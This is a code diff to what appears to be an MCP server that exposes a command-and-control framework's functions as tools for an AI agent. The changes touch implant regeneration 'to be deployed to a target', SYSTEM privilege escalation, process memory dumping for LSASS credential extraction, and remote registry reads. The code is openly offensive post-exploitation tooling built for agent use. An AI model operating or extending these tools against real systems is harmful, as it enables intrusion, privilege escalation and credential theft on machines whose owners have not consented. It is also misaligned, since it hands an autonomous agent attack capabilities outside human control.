@@ -259,7 +259,7 @@ async def get_implant_builds() -> list[dict]:
             "os": build.GOOS,
             "arch": build.GOARCH,
             "format": str(build.Format),
-            "c2_urls": c2_urls,
+            "c2": c2_urls,
             "is_beacon": build.IsBeacon,
         })
     return result
@@ -267,14 +267,13 @@ async def get_implant_builds() -> list[dict]:
 
 @mcp.tool
 async def regenerate_implant(
-    implant_name: Annotated[str, "Name of the implant build to regenerate"],
-) -> dict:
-    """Regenerate a previously compiled implant and save to a local file."""
+    implant_name: Annotated[str, "Name of a previously generated implant to regenerate."],
+) -> str:
+    """Regenerate a previously compiled implant by name. Returns the implant binary which can then be deployed to a target."""
     client = await _get_client()
-    data = await client.regenerate_implant(implant_name)
-    tmp = Path(tempfile.mkdtemp()) / implant_name
-    tmp.write_bytes(data)
-    return {"name": implant_name, "path": str(tmp), "size_kb": len(data) / 1024}
+    result = await client.regenerate_implant(implant_name, timeout=360)
+    size_kb = len(result.File.Data) / 1024
+    return f"Regenerated implant '{implant_name}' ({size_kb:.1f} KB)"
 
 
 # ── Implant tools (require interact() first) ────────────────────────
@@ -572,7 +571,7 @@ async def get_system() -> str:
     result = await _resolve(
         await impl.get_system(hosting_process="", config=client_pb2.ImplantConfig())
     )
-    return f"Elevated to SYSTEM — new session ID: {result.Session.ID}"
+    return f"Elevated to SYSTEM. New session: {result.Session.ID if result.Session else 'pending'}"
 
 
 @mcp.tool
@@ -582,9 +581,9 @@ async def process_dump(
     """Dump the memory of a process on the target (e.g. for LSASS credential extraction)."""
     impl = await _get_interact()
     result = await _resolve(await impl.process_dump(pid))
-    tmp = Path(tempfile.mkdtemp()) / f"process_{pid}.dmp"
+    tmp = Path(tempfile.mkdtemp()) / f"procdump_{pid}.dmp"
     tmp.write_bytes(result.Data)
-    return {"path": str(tmp), "size_kb": len(result.Data) / 1024}
+    return {"name": f"procdump_{pid}.dmp", "path": str(tmp), "size_kb": len(result.Data) / 1024}
 
 
 @mcp.tool
@@ -597,7 +596,7 @@ async def registry_read(
     """Read a value from the Windows registry on the target."""
     impl = await _get_interact()
     result = await _resolve(await impl.registry_read(hive, reg_path, key, hostname))
-    return result.Value
+    return f"Registry value [{hive}\\{reg_path}\\{key}]: {result.Value}"
 
 
 @mcp.tool
